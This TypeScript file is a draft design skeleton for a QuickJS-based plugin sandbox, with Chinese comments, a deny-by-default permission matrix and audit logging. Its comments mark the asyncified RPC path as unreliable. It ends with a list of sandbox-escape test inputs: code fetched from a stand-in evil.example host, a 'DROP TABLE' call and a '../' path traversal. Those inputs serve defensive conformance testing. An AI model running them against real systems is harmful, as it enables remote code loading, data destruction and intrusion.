/**
 * 沙箱运行时骨架（讨论稿，非最终实现）
 *
 * 目的：证明「第三方插件代码运行在 QuickJS(WASM) 中，只能通过宿主注入的 ctx
 * 访问能力」这一设计是可实现的，并明确权限校验发生在哪一层。
 *
 * 关键性质：
 *  1. 插件世界是全新 realm。全局对象只有 ECMAScript 内置 + 我们注入的 ctx。
 *     不存在 fetch / XMLHttpRequest / WebSocket / importScripts / indexedDB /
 *     localStorage / document / globalThis.process / require。
 *  2. 所有能力调用都过 RPC → 宿主侧 dispatch → 权限矩阵 → 真实实现。
 *  3. 权限校验在**宿主侧**（沙箱外）执行。插件即使伪造 method 名也没用。
 *  4. 输出经 JSON 序列化边界，插件无法向宿主传递函数/原型/引用。
 *
 * 依赖：quickjs-emscripten（asyncify 版本，用于支持 Promise）
 */

import {
  newQuickJSAsyncWASMModule,          // asyncify 版本
  type QuickJSAsyncContext,
  type QuickJSAsyncRuntime,
  type QuickJSHandle,
} from 'quickjs-emscripten';

// 契约类型来自 docs/design/api-v1.d.ts（实际工程中为 @matrix/plugin-api）
import type {
  Permissions,
  PluginError,
  ErrorCode,
  HostInfo,
} from './api-v1';

// ------------------------------------------------------------------ 权限矩阵

/** RPC 方法 → 所需权限判定。返回 null 表示允许，否则返回拒绝原因。 */
type Guard = (params: any, granted: Permissions, pluginId: string) => PluginError | null;

const GUARDS: Record<string, Guard> = {
  'db.collection': () => null, // 隐式允许，但只作用于自身命名空间（由实现层强制加前缀）

  'db.raw': (_p, g) =>
    g.privileged?.includes('db.raw') ? null : { code: 'EPERM', message: 'db.raw 未授权（需人工审核）' },

  'bus.emit': (p, g) =>
    g.data?.write?.includes(p.entity) ? null : { code: 'EPERM', message: `未声明 data.write: ${p.entity}` },

  'bus.read': (p, g) =>
    g.data?.read?.includes(p.entity) ? null : { code: 'EPERM', message: `未声明 data.read: ${p.entity}` },

  'net.request': (p, g) => {
    const url = new URL(p.req.url);
    if (url.protocol !== 'https:') return { code: 'ENETDENIED', message: '仅允许 https' };
    if (/^\d+\.\d+\.\d+\.\d+$/.test(url.hostname)) return { code: 'ENETDENIED', message: '禁止 IP 字面量' };
    const ok = (g.net?.domains ?? []).some((d) =>
      d.startsWith('*.') ? url.hostname.endsWith(d.slice(1)) : url.hostname === d,
    );
    if (!ok) return { code: 'ENETDENIED', message: `域名不在白名单: ${url.hostname}` };
    const m = (p.req.method ?? 'GET').toUpperCase();
    if (g.net?.methods && !g.net.methods.includes(m as any)) return { code: 'ENETDENIED', message: `方法未授权: ${m}` };
    return null;
  },

  'auth.login': (p, g) =>
    g.auth?.providers?.includes(p.provider) ? null : { code: 'EPERM', message: `未声明 auth.providers: ${p.provider}` },
  'auth.session': (p, g) =>
    g.auth?.providers?.includes(p.provider) ? null : { code: 'EPERM', message: `未声明 auth.providers: ${p.provider}` },

  'notify.show': (_p, g) => (g.notify ? null : { code: 'EPERM', message: '未声明 notify' }),

  'schedule.at': (_p, g) =>
    g.background?.exact ? null : { code: 'EPERM', message: '精确调度需声明 background.exact' },

  'fs.read':  (_p, g) => (g.fs === 'read' || g.fs === 'write' ? null : { code: 'EPERM', message: '未声明 fs' }),
  'fs.write': (_p, g) => (g.fs === 'write' ? null : { code: 'EPERM', message: '未声明 fs.write' }),

  'secrets.get': (_p, g) => (g.secrets ? null : { code: 'EPERM', message: '未声明 secrets' }),
  'secrets.set': (_p, g) => (g.secrets ? null : { code: 'EPERM', message: '未声明 secrets' }),

  'llm.complete': (_p, g) => (g.llm?.local ? null : { code: 'EPERM', message: '未声明 llm.local' }),
};

/**
 * 审计出口。宿主注入真实实现（写入 `audit_log` 表）；未注入时丢弃。
 * 所有被拒的能力调用都必须留痕，用户可在「插件活动」页面看到。
 */
let audit: (row: {
  ts: number; actor: string; action: string; ok: 0 | 1; detail?: string;
}) => void = () => { /* 默认丢弃 */ };

export function setAuditSink(fn: typeof audit) { audit = fn; }

/** 未在表中出现的方法一律拒绝 —— 默认拒绝（deny by default）。 */
function authorize(method: string, params: any, granted: Permissions, pluginId: string): PluginError | null {
  const guard = GUARDS[method];
  if (!guard) return { code: 'EPERM', message: `未知方法: ${method}` };
  const err = guard(params, granted, pluginId);
  if (err) {
    audit({ ts: Date.now(), actor: pluginId, action: method, ok: 0, detail: err.message });
  }
  return err;
}

// ------------------------------------------------------------------ 宿主侧分发

export interface SandboxHost {
  dispatch(method: string, params: any): Promise<unknown>;
  audit(entry: { ts: number; actor: string; action: string; ok: 0 | 1; detail?: string }): void;
}

// ------------------------------------------------------------------ 沙箱

export interface SandboxOptions {
  pluginId: string;
  bundleSource: string;
  granted: Permissions;
  host: SandboxHost;
  hostInfo: HostInfo;
  /** 单次 RPC 的 CPU/时间预算，超时直接终结 VM */
  rpcTimeoutMs?: number;
  memoryLimitBytes?: number;
  stackLimitBytes?: number;
}

export class PluginSandbox {
  private ctx!: QuickJSAsyncContext;
  private runtime!: QuickJSAsyncRuntime;
  private disposed = false;
  /** 置位后 VM 会尽快中断当前执行（用于超时熔断） */
  private interrupted = false;
  /**
   * 模块实例是否已污染。asyncify 状态是 **WASM 模块实例级**的全局状态，
   * 一旦被同步 evalCode 打坏，同实例下所有 runtime 全部报废 —— 只能整块丢弃重建。
   * 因此生产实现里：**一个插件 VM 独占一个模块实例**，最好再各跑在独立 Worker 里。
   */
  private poisoned = false;

  static async create(opts: SandboxOptions): Promise<PluginSandbox> {
    const s = new PluginSandbox();
    await s.init(opts);
    return s;
  }

  private async init(opts: SandboxOptions) {
    const QuickJS = await newQuickJSAsyncWASMModule();
    const runtime = QuickJS.newRuntime();
    this.runtime = runtime;

    // 资源硬限制：插件死循环或爆内存不会拖垮宿主
    runtime.setMemoryLimit(opts.memoryLimitBytes ?? 64 * 1024 * 1024);
    runtime.setMaxStackSize(opts.stackLimitBytes ?? 512 * 1024);
    // 中断回调：返回 true 即中断当前 JS 执行
    runtime.setInterruptHandler(() => this.interrupted);

    this.ctx = runtime.newContext();

    // ---- 构造插件世界。注意：我们**不**删除全局对象，因为本来就没有。
    // 这里显式覆盖掉一些 QuickJS 默认提供、但我们不希望插件使用的内置能力。
    this.ctx.evalCode(`
      "use strict";
      // 冻结内置原型，降低原型污染攻击面（沙箱内自伤，不影响宿主）
      // 注意：这些只是纵深防御，真正的边界是「没有 fetch 这个标识符」
      Object.freeze(Object.prototype);
      Object.freeze(Array.prototype);
      Object.freeze(Function.prototype);
    `);

    // ---- 注入 ctx：一个纯数据 + 函数的对象，函数由宿主侧实现
    const ctxHandle = this.ctx.newObject();

    this.defineHostInfo(ctxHandle, opts.hostInfo);
    this.defineRpc(ctxHandle, opts);

    // db / bus / net / auth / ui 等都挂在一个 __rpc 之上
    this.ctx.setProp(this.ctx.global, 'ctx', ctxHandle);
    ctxHandle.dispose();

    // ---- 加载插件 bundle。它是 IIFE，导出 { activate, connectors, parsers, tasks }
    const wrapped = `
      (function () {
        var module = { exports: {} };
        var exports = module.exports;
        ${opts.bundleSource}
        globalThis.__PLUGIN__ = module.exports;
      })();
    `;
    const res = this.ctx.evalCode(wrapped, `${opts.pluginId}.js`);
    if (res.error) {
      const e = this.ctx.dump(res.error);
      res.error.dispose();
      throw new Error(`插件加载失败: ${JSON.stringify(e)}`);
    }
    res.value.dispose();
    this.ctx.runtime.executePendingJobs();
  }

  /** 把 __rpc 注入为 async 函数。这是插件唯一的对外出口。 */
  private defineRpc(ctxHandle: QuickJSHandle, opts: SandboxOptions) {
    const ctx = this.ctx;
    const timeoutMs = opts.rpcTimeoutMs ?? 20_000;

    // ⚠️ P0-S4 实测：`newAsyncifiedFunction` + 插件侧顺序 await **不可靠** ——
    //    第二次宿主调用会让 asyncify 状态损坏（WASM 内存越界），且状态是模块实例级全局的。
    //    本文件保留此写法仅用于记录与对照；**生产实现请用 §5.5 的纯函数模型**
    //    （见 spikes/p0/src/s4b-sync-runtime.test.ts，10/10 通过）。
    const rpc = ctx.newAsyncifiedFunction('__rpc', async (methodHandle: QuickJSHandle, paramsHandle: QuickJSHandle) => {
      const method = ctx.getString(methodHandle);
      const params = ctx.dump(paramsHandle);

      // ① 宿主侧权限校验（沙箱外执行，插件无法绕过）
      const denied = authorize(method, params, opts.granted, opts.pluginId);
      // ② 抛错 → 插件侧得到 rejected Promise，可 try/catch 优雅降级
      if (denied) throw new Error(`${denied.code}: ${denied.message}`);

      const started = Date.now();
      try {
        // ③ 真实调用宿主实现。结果经 JSON 边界回传 —— 函数、原型、引用都无法穿过。
        const result = await withTimeout(opts.host.dispatch(method, params), timeoutMs);
        opts.host.audit({ ts: started, actor: opts.pluginId, action: method, ok: 1 });
        return ctxNewJson(ctx, result);
      } catch (err: any) {
        const code: ErrorCode = err?.code ?? (err?.name === 'TimeoutError' ? 'ETIMEOUT' : 'EINTERNAL');
        opts.host.audit({ ts: started, actor: opts.pluginId, action: method, ok: 0, detail: `${code}: ${err?.message ?? err}` });
        // 超时同时熔断 VM，防止插件继续空转
        if (code === 'ETIMEOUT') this.interrupt();
        throw new Error(`${code}: ${err?.message ?? err}`);
      }
    });

    ctx.setProp(ctxHandle, '__rpc', rpc);
    rpc.dispose();

    // 在沙箱内把它包装成 ctx.db / ctx.net / ... 的友好形态（纯 JS，无宿主能力）
    const bootstrap = `
      const __call = (m, p) => __rpc(m, p);
      ctx.db    = { collection: (n) => makeCollection(n), transaction: (f) => __call('db.transaction', {}).then(() => f()) };
      ctx.bus   = { emit: (e,o,d) => __call('bus.emit',{entity:e,op:o,payload:d}),
                    read: (e,w,o) => __call('bus.read',{entity:e,where:w,opts:o}) };
      ctx.net   = { request: (r) => __call('net.request',{req:r}) };
      ctx.auth  = { login: (p,o) => __call('auth.login',{provider:p,opts:o}),
                    session: (p) => __call('auth.session',{provider:p}) };
      ctx.notify= { show: (n) => __call('notify.show',{n}) };
      ctx.schedule = { at: (t,id,p) => __call('schedule.at',{when:t,taskId:id,payload:p}) };
      ctx.fs    = { read: (r,p) => __call('fs.read',{root:r,path:p}) };
      ctx.secrets = { get: (k) => __call('secrets.get',{key:k}), set: (k,v) => __call('secrets.set',{key:k,value:v}) };
      ctx.llm   = { complete: (r) => __call('llm.complete',{req:r}) };
      function makeCollection(n) {
        return {
          insert: (d) => __call('db.collection',{name:n,op:'insert',doc:d}),
          find:   (w,o) => __call('db.collection',{name:n,op:'find',where:w,opts:o}),
          get:    (id) => __call('db.collection',{name:n,op:'get',id}),
          update: (id,p) => __call('db.collection',{name:n,op:'update',id,patch:p}),
          delete: (id) => __call('db.collection',{name:n,op:'delete',id}),
        };
      }
    `;
    const b = this.ctx.evalCode(bootstrap);
    if (b.error) { const e = this.ctx.dump(b.error); b.error.dispose(); throw new Error(JSON.stringify(e)); }
    b.value.dispose();
    this.ctx.runtime.executePendingJobs();
  }

  private defineHostInfo(ctxHandle: QuickJSHandle, info: HostInfo) {
    const o = this.ctx.newObject();
    this.ctx.setProp(o, 'apiVersion', this.ctx.newString(info.apiVersion));
    this.ctx.setProp(o, 'platform', this.ctx.newString(info.platform));
    this.ctx.setProp(o, 'locale', this.ctx.newString(info.locale));
    this.ctx.setProp(o, 'capabilities', ctxNewJson(this.ctx, info.capabilities));
    this.ctx.setProp(ctxHandle, 'host', o);
    o.dispose();
  }

  // ---------------------------------------------------------------- 生命周期

  async activate(): Promise<void> {
    await this.callPlugin('activate');
  }

  async invokeParser(parserId: string, input: unknown): Promise<unknown> {
    return this.callPlugin('parsers', parserId, input);
  }

  async invokeTask(taskId: string, payload: unknown): Promise<void> {
    await this.callPlugin('tasks', taskId, payload);
  }

  /**
   * R1：**唯一**求值入口，永远走 evalCodeAsync，绝不使用同步 evalCode。
   *
   * P0-S4 实证：同步 evalCode 一旦碰到 asyncified 函数，asyncify 状态会被永久挂起，
   * 且该状态是 **WASM 模块实例级**的 —— 同一模块实例下所有 runtime 全部报废
   * （表现为 "Already suspended" / "null function or function signature mismatch" /
   * "memory access out of bounds"）。且此后再 dispose 会触发 WASM abort。
   * 唯一的恢复方式是丢弃整个模块实例、重建一个。
   */
  private async evalAsync(code: string): Promise<unknown> {
    const handle = this.ctx.unwrapResult(await this.ctx.evalCodeAsync(code));
    const value = this.ctx.dump(handle);
    handle.dispose();
    return value;
  }

  private async callPlugin(path: string, key?: string, arg?: unknown): Promise<unknown> {
    if (this.disposed) throw new Error('sandbox disposed');
    this.interrupted = false;                       // 每次调用前复位熔断标志

    const expr = key
      ? `__PLUGIN__.${path}[${JSON.stringify(key)}](ctx, __ARG__)`
      : `__PLUGIN__.${path}(ctx)`;

    // R2：求值结果必须是 undefined。
    //     若让这段代码返回那个 pending 的 Promise handle，宿主 dump 后会 dispose 它，
    //     之后 promise 落定时 QuickJS 会踩到已释放的 lifetime（Lifetime not alive）。
    // R3：不要用 ctx.resolvePromise —— 即使 promise 已 settle 它也会挂住。
    //     改用「.then 写全局哨兵 + pump 微任务」。
    await this.evalAsync(`
      globalThis.__ARG__ = (${JSON.stringify(arg ?? null)});
      globalThis.__R__ = undefined;
      globalThis.__E__ = undefined;
      Promise.resolve(${expr}).then(
        (v) => { globalThis.__R__ = v; },
        (e) => { globalThis.__E__ = (e && e.message) || String(e); }
      );
      undefined;
    `);

    for (let i = 0; i < 400; i++) {
      this.ctx.runtime.executePendingJobs();
      if (await this.evalAsync('globalThis.__R__ !== undefined || globalThis.__E__ !== undefined')) break;
      await new Promise((r) => setTimeout(r, 0));
    }

    const err = await this.evalAsync('globalThis.__E__ === undefined ? null : globalThis.__E__');
    if (err !== null) throw new Error(`插件运行时错误: ${String(err)}`);
    return this.evalAsync('globalThis.__R__');
  }

  /** 让 VM 在当前指令边界尽快中断 */
  interrupt() { this.interrupted = true; }

  /**
   * R5：异常状态下的 dispose 会触发 WASM abort。
   * 该 abort 是**可被 try/catch 捕获**的 JS 异常（进程不会死），
   * 但模块实例已经被污染，必须整块丢弃并重建 —— 这正是「一个插件一个模块实例」的理由。
   */
  dispose() {
    this.disposed = true;
    try { this.ctx.dispose(); } catch { /* 已污染，忽略 */ }
    try { this.runtime.dispose(); } catch { /* 同上 */ }
    this.poisoned = true;
  }
}

// ------------------------------------------------------------------ 辅助

function withTimeout<T>(p: Promise<T>, ms: number): Promise<T> {
  return new Promise<T>((resolve, reject) => {
    const timer = setTimeout(
      () => reject(Object.assign(new Error(`RPC 超时 ${ms}ms`), { name: 'TimeoutError' })),
      ms,
    );
    p.then(
      (v) => { clearTimeout(timer); resolve(v); },
      (e) => { clearTimeout(timer); reject(e); },
    );
  });
}

/**
 * 把宿主侧的值转成 QuickJS handle。经 JSON 边界，天然剥离函数、原型与引用。
 *
 * ⚠️ P0-S4 实证修正：JSON 对象字面量**必须用括号包起来**再求值。
 *    直接 `evalCode('{"a":1}')` 会被解析成块语句，`"a":` 不是合法标签，报 `expecting ';'`。
 *    数组 `[1,2]`、数字、字符串、null 在语句位置是合法的，只有 `{...}` 会踩这个坑。
 *
 * ⚠️ 另外：本函数用的是**同步** evalCode，只允许在插件尚未发起任何 asyncified 调用前使用
 *    （见文件内 R1 纪律）。运行时路径请改用 evalAsync()。
 */
function ctxNewJson(ctx: QuickJSAsyncContext, value: unknown): QuickJSHandle {
  return ctx.unwrapResult(ctx.evalCode(`(${JSON.stringify(value ?? null)})`));
}

// ------------------------------------------------------------------ 逃逸测试用例（必须全部失败）

/**
 * tools/conformance/sandbox-escape.test.ts 的核心断言。
 * 每一条都必须在沙箱里返回「不可用」。
 */
export const ESCAPE_ATTEMPTS = [
  `typeof fetch`,                                  // → 'undefined'
  `typeof XMLHttpRequest`,                         // → 'undefined'
  `typeof importScripts`,                          // → 'undefined'
  `typeof require`,                                // → 'undefined'
  `typeof process`,                                // → 'undefined'
  `typeof document`,                               // → 'undefined'
  `typeof localStorage`,                           // → 'undefined'
  `(function(){}).constructor('return typeof fetch')()`,   // → 'undefined'（无 fetch 可取回）
  `try { await import('https://evil.example/x.js') } catch (e) { 'blocked' }`,
  `__rpc('net.request', { req: { url: 'https://evil.example/' } })`,  // → EPERM/ENETDENIED
  `__rpc('bus.emit', { entity: 'ddl', op: 'upsert', payload: {} })`,  // 未声明 → EPERM
  `__rpc('db.raw', { sql: 'DROP TABLE event' })`,                     // → EPERM
  `__rpc('totally.made.up', {})`,                                     // → EPERM
  `__rpc('db.collection', { name: '../event', op: 'find' })`,         // 集合名非法 → EPERM
];
